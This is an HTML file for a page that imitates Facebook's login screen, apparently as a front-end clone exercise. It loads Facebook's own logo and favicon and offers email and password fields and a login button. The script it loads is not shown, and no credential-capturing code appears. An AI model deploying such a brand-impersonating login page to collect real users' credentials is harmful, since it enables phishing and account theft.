<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook - log in or sign up</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
        <link rel="stylesheet" href="style.css">
        <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 first"><br><br><br><br>
                <img src="	https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="col-md-6 col-sm-12">
                <div class="login-form">
                    <input type="email" name="" id="email" placeholder="Email address or phone number"><br>
                    <input type="password" name="" id="password" placeholder="password"><br>
                    <button id="login">Log in</button><br><br>
                    <a href="#">Forgotten password?</a><hr>
                    <button id="create">Create new account</button>
                </div><br>
                <p><b>Create a Page</b> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>


    <script type="module" src="app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
        crossorigin="anonymous"></script>
</body>

</html>
